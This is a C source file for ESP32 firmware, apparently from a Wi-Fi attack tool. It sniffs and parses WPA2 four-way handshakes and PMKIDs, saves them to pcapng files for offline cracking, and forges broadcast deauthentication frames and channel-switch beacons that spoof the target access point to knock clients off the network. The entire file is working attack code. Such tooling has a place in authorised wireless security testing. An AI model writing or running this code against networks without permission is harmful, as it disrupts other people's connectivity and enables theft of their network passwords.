#include "handshake.h"
#include "utils.h"
#include "scanner.h"
#include "storage.h"
#include "esp_spiffs.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

static HandshakeCb _hsCb = NULL;

#define MAX_SESSIONS 8
typedef struct {
    uint8_t      bssid[6];
    uint8_t      sta[6];
    char         ssid[33];
    uint8_t      ssid_len;
    uint8_t      channel;
    int8_t       rssi;
    uint8_t      anonce[32];
    uint8_t      snonce[32];
    uint8_t      m1_replay_counter[8];
    uint8_t      mic[16];
    uint32_t     created_ms;
    uint8_t      eapol_buffer[512];
    uint16_t     m2_off, m2_len;
    uint16_t     m3_off, m3_len;
    uint16_t     m4_off, m4_len;
    struct {
        uint8_t active : 1;
        uint8_t has_m1 : 1;
        uint8_t has_m2 : 1;
        uint8_t has_m3 : 1;
        uint8_t has_m4 : 1;
    } flags;
} Session;

static Session _sessions[MAX_SESSIONS];

static Session* _findSession(const uint8_t* bssid, const uint8_t* sta) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (_sessions[i].flags.active && memcmp(_sessions[i].bssid, bssid, 6) == 0 && memcmp(_sessions[i].sta, sta, 6) == 0)
            return &_sessions[i];
    }
    return NULL;
}

static Session* _createSession(const uint8_t* bssid, const uint8_t* sta) {
    int oldest = 0;
    uint32_t oldestTime = UINT32_MAX;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!_sessions[i].flags.active) {
            memset(&_sessions[i], 0, sizeof(Session));
            memcpy(_sessions[i].bssid, bssid, 6);
            memcpy(_sessions[i].sta, sta, 6);
            _sessions[i].flags.active = true;
            _sessions[i].created_ms = millis();
            for (int a = 0; a < getApCount(); a++) {
                ApRecord ap;
                if (getAp(a, &ap) && memcmp(ap.bssid, bssid, 6) == 0) {
                    strlcpy(_sessions[i].ssid, ap.ssid, 33);
                    _sessions[i].ssid_len = ap.ssid_len;
                    break;
                }
            }
            return &_sessions[i];
        }
        if (_sessions[i].created_ms < oldestTime) {
            oldestTime = _sessions[i].created_ms;
            oldest = i;
        }
    }
    memset(&_sessions[oldest], 0, sizeof(Session));
    memcpy(_sessions[oldest].bssid, bssid, 6);
    memcpy(_sessions[oldest].sta, sta, 6);
    _sessions[oldest].flags.active = true;
    _sessions[oldest].created_ms = millis();
    return &_sessions[oldest];
}

static void _expireSessions(uint32_t timeoutMs) {
    uint32_t now = millis();
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (_sessions[i].flags.active && (now - _sessions[i].created_ms) > timeoutMs)
            _sessions[i].flags.active = false;
    }
}

static void _hsParseEapol(const uint8_t* bssid, const uint8_t* sta,
                          const uint8_t* eapol, uint16_t len, int8_t rssi,
                          uint8_t channel) {
    if (len < 4 || eapol[1] != 0x03) return;

    const uint8_t* key = eapol + 4;
    uint16_t key_len = len - 4;
    if (key_len < 95) return;
    if (key[0] != 0x02) return;

    uint16_t key_info = ((uint16_t)key[1] << 8) | key[2];
    bool is_pairwise = (key_info & 0x0008) != 0;
    if (!is_pairwise) return;

    uint8_t msg = 0;
    if ((key_info & 0x0080) && !(key_info & 0x0100) && !(key_info & 0x0200)) msg = 1;
    else if (!(key_info & 0x0080) && (key_info & 0x0100) && !(key_info & 0x0200)) msg = 2;
    else if ((key_info & 0x0080) && (key_info & 0x0100) && (key_info & 0x0200)) msg = 3;
    else if (!(key_info & 0x0080) && (key_info & 0x0100) && (key_info & 0x0200)) msg = 4;

    if (msg == 0) return;

    Session* sess = _findSession(bssid, sta);
    if (!sess) sess = _createSession(bssid, sta);
    if (!sess) return;

    sess->channel = channel;
    sess->rssi = rssi;

    if (msg == 1) {
        memcpy(sess->anonce, key + 5 + 8, 32);
        memcpy(sess->m1_replay_counter, key + 5, 8);
        sess->flags.has_m1 = true;

        uint16_t kdata_len = ((uint16_t)key[93] << 8) | key[94];
        uint16_t kdata_start = 95;
        if (kdata_len >= 18 && key_len >= kdata_start + kdata_len) {
            const uint8_t* kdata = key + kdata_start;
            for (uint16_t i = 0; i + 22 <= kdata_len; i++) {
                if (kdata[i] == 0xDD && kdata[i+2] == 0x00 && kdata[i+3] == 0x0F && kdata[i+4] == 0xAC && kdata[i+5] == 0x04) {
                    HandshakeRecord rec;
                    memset(&rec, 0, sizeof(rec));
                    rec.type = CAP_PMKID;
                    rec.channel = channel;
                    rec.rssi = rssi;
                    memcpy(rec.bssid, bssid, 6);
                    memcpy(rec.sta, sta, 6);
                    memcpy(rec.ssid, sess->ssid, 33);
                    rec.ssid_len = sess->ssid_len;
                    rec.enc = 3;
                    memcpy(rec.pmkid, kdata + i + 6, 16);
                    if (_hsCb) _hsCb(&rec);
                    break;
                }
            }
        }
    } else if (msg == 2) {
        if (sess->flags.has_m1 && memcmp(key + 5, sess->m1_replay_counter, 8) != 0) return;
        memcpy(sess->mic, key + 5 + 8 + 32 + 32, 16);
        memcpy(sess->snonce, key + 5 + 8, 32);
        sess->m2_off = 0;
        uint16_t store_len = (len < 256) ? len : 256;
        memcpy(sess->eapol_buffer + sess->m2_off, eapol, store_len);
        sess->m2_len = store_len;
        sess->flags.has_m2 = true;
        sess->m3_off = store_len;
        sess->m4_off = store_len;

        if (sess->flags.has_m1) {
            HandshakeRecord rec;
            memset(&rec, 0, sizeof(rec));
            rec.type = CAP_EAPOL;
            rec.channel = channel;
            rec.rssi = rssi;
            memcpy(rec.bssid, bssid, 6);
            memcpy(rec.sta, sta, 6);
            memcpy(rec.ssid, sess->ssid, 33);
            rec.ssid_len = sess->ssid_len;
            rec.enc = 3;
            memcpy(rec.anonce, sess->anonce, 32);
            memcpy(rec.snonce, sess->snonce, 32);
            memcpy(rec.mic, sess->mic, 16);
            memcpy(rec.eapol_m2, sess->eapol_buffer + sess->m2_off, sess->m2_len);
            rec.eapol_m2_len = sess->m2_len;
            rec.has_anonce = true;
            rec.has_snonce = true;
            rec.has_mic = true;
            rec.is_full = false;
            if (_hsCb) _hsCb(&rec);
        }
    } else if (msg == 3) {
        if (!sess->flags.has_m1 || !sess->flags.has_m2) return;
        uint16_t store_len = (len < 256) ? len : 256;
        if (sess->m3_off + store_len <= sizeof(sess->eapol_buffer)) {
            memcpy(sess->eapol_buffer + sess->m3_off, eapol, store_len);
            sess->m3_len = store_len;
            sess->flags.has_m3 = true;
            sess->m4_off = sess->m3_off + store_len;
        }
    } else if (msg == 4) {
        if (!sess->flags.has_m1 || !sess->flags.has_m2 || !sess->flags.has_m3) return;
        uint16_t store_len = (len < 256) ? len : 256;
        if (sess->m4_off + store_len <= sizeof(sess->eapol_buffer)) {
            memcpy(sess->eapol_buffer + sess->m4_off, eapol, store_len);
            sess->m4_len = store_len;
            sess->flags.has_m4 = true;
        }
        if (sess->flags.has_m1 && sess->flags.has_m2 && sess->flags.has_m3 && sess->flags.has_m4) {
            HandshakeRecord rec;
            memset(&rec, 0, sizeof(rec));
            rec.type = CAP_EAPOL;
            rec.channel = channel;
            rec.rssi = rssi;
            memcpy(rec.bssid, bssid, 6);
            memcpy(rec.sta, sta, 6);
            memcpy(rec.ssid, sess->ssid, 33);
            rec.ssid_len = sess->ssid_len;
            rec.enc = 3;
            memcpy(rec.anonce, sess->anonce, 32);
            memcpy(rec.snonce, sess->snonce, 32);
            memcpy(rec.mic, sess->mic, 16);
            memcpy(rec.eapol_m2, sess->eapol_buffer + sess->m2_off, sess->m2_len);
            rec.eapol_m2_len = sess->m2_len;
            memcpy(rec.eapol_m3, sess->eapol_buffer + sess->m3_off, sess->m3_len);
            rec.eapol_m3_len = sess->m3_len;
            memcpy(rec.eapol_m4, sess->eapol_buffer + sess->m4_off, sess->m4_len);
            rec.eapol_m4_len = sess->m4_len;
            rec.has_anonce = true;
            rec.has_snonce = true;
            rec.has_mic = true;
            rec.has_m3 = true;
            rec.has_m4 = true;
            rec.is_full = true;
            if (_hsCb) _hsCb(&rec);
            sess->flags.active = false;
        }
    }
}

RING_BUFFER_DECLARE(pa, 64, 400) // reuse from packet_analyzer
static pa_ring_t _paRingHS;

static void IRAM_ATTR _hsISR(void* buf, wifi_promiscuous_pkt_type_t) {
    if (!buf) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 10) return;
    pa_push(&_paRingHS, pkt->payload, pkt->rx_ctrl.sig_len,
            pkt->rx_ctrl.rssi, (uint8_t)pkt->rx_ctrl.channel);
}

static void _sendCsaBurst(const uint8_t* bssid, uint8_t new_ch, const char* ssid, uint8_t ssid_len) {
    uint8_t frame[128];
    int p = 0;
    frame[p++] = 0x80; frame[p++] = 0x00;
    frame[p++] = 0x00; frame[p++] = 0x00;
    for (int i=0; i<6; i++) frame[p++] = 0xFF;
    memcpy(frame + p, bssid, 6); p += 6;
    memcpy(frame + p, bssid, 6); p += 6;
    frame[p++] = 0x00; frame[p++] = 0x00;
    memset(frame + p, 0, 8); p += 8;
    frame[p++] = 0x64; frame[p++] = 0x00;
    frame[p++] = 0x31; frame[p++] = 0x04;
    frame[p++] = 0x00; frame[p++] = ssid_len;
    memcpy(frame + p, ssid, ssid_len); p += ssid_len;
    frame[p++] = 0x01; frame[p++] = 0x08;
    frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
    frame[p++] = 0x24; frame[p++] = 0x30; frame[p++] = 0x48; frame[p++] = 0x6C;
    frame[p++] = 0x03; frame[p++] = 0x01;
    frame[p++] = new_ch;
    frame[p++] = 0x25; frame[p++] = 0x03;
    frame[p++] = 0x01;
    frame[p++] = new_ch;
    frame[p++] = 0x01;
    for (int i=0; i<8; i++) {
        wifi80211Tx(WIFI_IF_STA, frame, p, false);
        esp_rom_delay_us(1000);
    }
}

void setHandshakeCallback(HandshakeCb cb) {
    _hsCb = cb;
}

void startHandshakeCapture(const uint8_t* bssid, uint8_t channel,
                            const char* ssid, bool withDeauth,
                            volatile bool* stopFlag) {

    LOG_I(TAG_HS, "Handshake capture started for %s ch%d", ssid, channel);

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(80));
    setTxPower(CFG_TX_POWER);

    if (!enablePromiscuous(WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT, _hsISR)) {
        LOG_E(TAG_HS, "Failed to enable promiscuous mode!");
        return;
    }
    if (!setChannel(channel)) { disablePromiscuous(); return; }

    pa_reset(&_paRingHS);

    char filename[64];
    snprintf(filename, sizeof(filename), "/spiffs/handshake_%s.pcapng", ssid);
    for (int i = 0; filename[i]; i++) if (filename[i] == ' ') filename[i] = '_';

    PcapngFileLogger pcap;
    if (!pcapng_logger_open(&pcap, filename)) {
        LOG_E(TAG_HS, "Failed to create PCAP file");
        disablePromiscuous();
        return;
    }

    uint32_t startMs = millis();
    uint32_t lastDeauth = 0;

    LOG_I(TAG_HS, "Capturing... send 's' to stop.");

    while (!(*stopFlag) && (millis() - startMs < (CFG_HS_TIMEOUT_SEC * 1000UL))) {
        pa_entry_t entry;
        while (pa_pop(&_paRingHS, &entry)) {
            const uint8_t* pl = entry.data;
            uint16_t len = entry.len;
            int8_t rssi = entry.rssi;
            uint8_t ch = entry.channel;

            if (len < 24) continue;
            const uint8_t* hdr = pl;
            bool isData = ((hdr[0] & 0x0C) == 0x08);
            if (!isData) continue;

            bool toDS   = (hdr[1] & 0x01) != 0;
            bool fromDS = (hdr[1] & 0x02) != 0;
            const uint8_t* bssidPtr = hdr + 16;
            const uint8_t* staPtr   = hdr + 10;
            if (toDS && !fromDS) { bssidPtr = hdr + 4; staPtr = hdr + 10; }
            else if (!toDS && fromDS) { bssidPtr = hdr + 10; staPtr = hdr + 4; }

            if (memcmp(bssidPtr, bssid, 6) != 0) continue;

            uint16_t hdrLen = 24;
            uint8_t subtype = (hdr[0] & 0xF0) >> 4;
            if (subtype >= 8 && subtype <= 11) hdrLen += 2;
            if (hdr[1] & 0x80) hdrLen += 4;
            if (len < hdrLen + 12) continue;
            const uint8_t* llc = pl + hdrLen;
            if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 ||
                llc[3] != 0x00 || llc[4] != 0x00 || llc[5] != 0x00 ||
                llc[6] != 0x88 || llc[7] != 0x8E) continue;

            const uint8_t* eapolData = llc + 8;
            uint16_t eapolLen = len - hdrLen - 8;
            _hsParseEapol(bssidPtr, staPtr, eapolData, eapolLen, rssi, ch);

            pcapng_logger_write(&pcap, pl, len, rssi, ch, (uint64_t)millis() * 1000);
        }

        if (withDeauth && millis() - lastDeauth > CFG_HS_DEAUTH_INTERVAL_MS) {
            uint8_t deauth[26] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,
                CFG_DEAUTH_REASON_AP, 0x00
            };
            memcpy(deauth + 10, bssid, 6);
            memcpy(deauth + 16, bssid, 6);
            for (int i=0; i<3; i++) {
                wifi80211Tx(WIFI_IF_STA, deauth, 26, false);
                esp_rom_delay_us(200);
            }
            lastDeauth = millis();
        }

        if (withDeauth && millis() - startMs > 2000 && millis() - startMs < 3000) {
            _sendCsaBurst(bssid, channel, ssid, strlen(ssid));
        }

        vTaskDelay(pdMS_TO_TICKS(20));
    }

    pcapng_logger_close(&pcap);
    disablePromiscuous();
    LOG_I(TAG_HS, "Handshake capture stopped.");
}
